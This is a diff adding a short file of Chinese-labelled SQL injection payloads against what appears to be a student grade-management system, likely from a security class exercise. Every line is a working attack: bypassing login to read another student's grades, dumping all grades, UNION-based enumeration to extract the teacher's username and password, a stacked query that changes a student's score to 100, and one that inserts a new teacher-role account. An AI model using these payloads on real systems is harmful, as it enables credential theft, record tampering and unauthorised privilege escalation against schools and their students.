@@ -1,0 +1,28 @@
+漏洞1.查詢他人成績，在不知道密碼的情況下(舉例查學生2)
+S002' #
+
+漏洞2.查詢全班成績
+'OR 1=1 #
+
+漏洞3.取得老師帳號密碼
+
+' ORDER BY 1 #        
+' ORDER BY 2 #        
+...
+' ORDER BY 7 #       
+
+' UNION SELECT 1,2,3,4,5,6 #
+
+' UNION SELECT 1,2,3,table_name,5,6 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = DATABASE() #      
+
+' UNION SELECT 1,2,3,column_name,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'userTable' #       
+
+' UNION SELECT 1, 2, 3, username, password, 999 FROM userTable WHERE role='teacher' #
+
+
+//漏洞4.竄改他人成績(舉例把學生1成績改為100)
+S001'; UPDATE scoreTable SET score = 100 WHERE studentId = 'S001' #
+
+
+//漏洞5:新增老師權限的帳號
+//任意文字'; INSERT INTO userTable (username, password, role) VALUES ('HackerTeacher', 'hack123', 'teacher'); #
